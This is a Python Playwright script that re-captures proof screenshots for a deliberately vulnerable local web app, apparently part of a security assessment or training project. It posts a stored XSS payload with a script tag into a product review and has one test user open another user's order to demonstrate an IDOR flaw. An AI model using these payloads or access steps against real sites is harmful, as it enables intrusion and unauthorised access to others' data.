"""Retake the two screenshots that did not prove their findings.

- xss-01-vulnerable-script-tag.png: submit a clearly visible XSS payload to a
  product review on the vulnerable build and screenshot the rendered HTML.
- idor-01-vulnerable-other-order.png: log in as bob (id 3) on the vulnerable
  build and view alice's order (id 1, user_id 2) so the screenshot shows that
  the order belongs to a different user than the current viewer.
"""

import re
import subprocess
import sys
from pathlib import Path

from playwright.sync_api import sync_playwright


REPO_ROOT = Path(__file__).resolve().parents[1]
PROOFS_DIR = REPO_ROOT / "Exploitation" / "Proofs"
VULN = "http://127.0.0.1:5001"


def reseed() -> None:
    subprocess.run([sys.executable, "seed.py"], check=True, cwd=REPO_ROOT)


def login(page, username: str, password: str) -> None:
    page.goto(f"{VULN}/auth/login")
    page.fill('input[name="username"]', username)
    page.fill('input[name="password"]', password)
    page.click('button[type="submit"]')
    page.wait_for_load_state("networkidle")


def capture_xss(context) -> None:
    page = context.new_page()
    login(page, "alice", "Alice1234!")

    page.goto(f"{VULN}/products/1")
    page.fill('input[name="rating"]', "5")
    # Use a visible XSS payload so the screenshot shows the injected element
    # rendered into the DOM. The bold + colored text proves the HTML escaped to
    # nothing and the styled element is being parsed as live HTML.
    payload = "<b style='color:red'>STORED_XSS_ALICE</b><script>document.title='XSS_FIRED'</script>"
    page.fill('textarea[name="text"]', payload)
    page.click('button[type="submit"]')
    page.wait_for_load_state("networkidle")

    title = page.title()
    print("post-submit page title:", title)
    target = PROOFS_DIR / "xss-01-vulnerable-script-tag.png"
    page.screenshot(path=str(target), full_page=True)
    print(f"saved {target}")


def capture_idor(context) -> None:
    page = context.new_page()
    login(page, "bob", "Bob1234!")
    page.goto(f"{VULN}/orders/1")
    page.wait_for_load_state("networkidle")
    html = page.content()
    customer_match = re.search(r"Customer ID: (\d+) \(current user ID: (\d+)\)", html)
    print("idor banner match:", customer_match.group(0) if customer_match else "not found")
    target = PROOFS_DIR / "idor-01-vulnerable-other-order.png"
    page.screenshot(path=str(target), full_page=True)
    print(f"saved {target}")


def main() -> None:
    reseed()
    PROOFS_DIR.mkdir(parents=True, exist_ok=True)
    with sync_playwright() as p:
        browser = p.chromium.launch()
        try:
            xss_context = browser.new_context(viewport={"width": 1280, "height": 800})
            capture_xss(xss_context)
            xss_context.close()

            idor_context = browser.new_context(viewport={"width": 1280, "height": 800})
            capture_idor(idor_context)
            idor_context.close()
        finally:
            browser.close()


if __name__ == "__main__":
    main()
